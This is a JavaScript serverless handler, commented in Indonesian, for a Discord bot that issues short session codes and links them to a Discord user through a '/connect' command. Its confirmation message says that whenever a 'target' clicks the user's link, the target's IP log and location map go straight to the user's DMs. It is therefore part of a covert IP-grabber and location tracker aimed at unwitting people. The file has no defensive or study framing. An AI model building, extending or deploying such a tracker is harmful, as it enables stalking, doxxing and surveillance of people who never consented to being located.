// Storage Sesi Sementara
global.connectSessions = global.connectSessions || {}; 
// Object Format: { "ARC-821": { userId: "123456789", expiresAt: timestamp } }

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN; 

export default async function handler(req, res) {
  const { action } = req.query;
  const now = Date.now();

  // =========================================================
  // 1. FRONTEND API: GENERATE KODE /CONNECT BARU
  // =========================================================
  if (action === 'generate') {
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const numbers = "0123456789";
    let code = "";
    for (let i = 0; i < 3; i++) code += letters.charAt(Math.floor(Math.random() * letters.length));
    code += "-";
    for (let i = 0; i < 3; i++) code += numbers.charAt(Math.floor(Math.random() * numbers.length));

    // Simpan kode (Expired dalam 15 Menit)
    global.connectSessions[code] = {
      userId: null,
      expiresAt: now + (15 * 60 * 1000)
    };

    return res.status(200).json({ status: 'success', code: code });
  }

  // =========================================================
  // 2. DISCORD INTERACTION / WEBHOOK EVENT HANDLER
  // =========================================================
  if (req.method === 'POST' && req.body) {
    const { content, author, channel_id } = req.body;

    if (content && content.startsWith('/connect')) {
      const inputCode = content.split(' ')[1] ? content.split(' ')[1].toUpperCase().trim() : '';
      const session = global.connectSessions[inputCode];

      if (!session || session.expiresAt < now) {
        await replyDiscordMessage(channel_id, "❌ **Kode Kadaluwarsa atau Salah!**\nSilakan klik tombol 'Dapatkan Kode /connect' lagi di Dashboard.");
        return res.status(200).json({ status: 'expired' });
      }

      // Ikat User ID Discord pengirim pesan ke Kode Sesi
      session.userId = author.id;

      await replyDiscordMessage(channel_id, `✅ **BERHASIL TERHUBUNG!**\nSesi kamu telah terikat. Setiap kali target klik link kamu, log IP & peta lokasi langsung dikirim ke DM ini.`);
      return res.status(200).json({ status: 'connected', userId: author.id });
    }
  }

  return res.status(200).json({ status: 'active' });
}

// Helper Kirim Pesan Balasan di Discord
async function replyDiscordMessage(channelId, text) {
  try {
    await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ content: text })
    });
  } catch (e) {
    console.error("Gagal mengirim pesan Discord:", e);
  }
}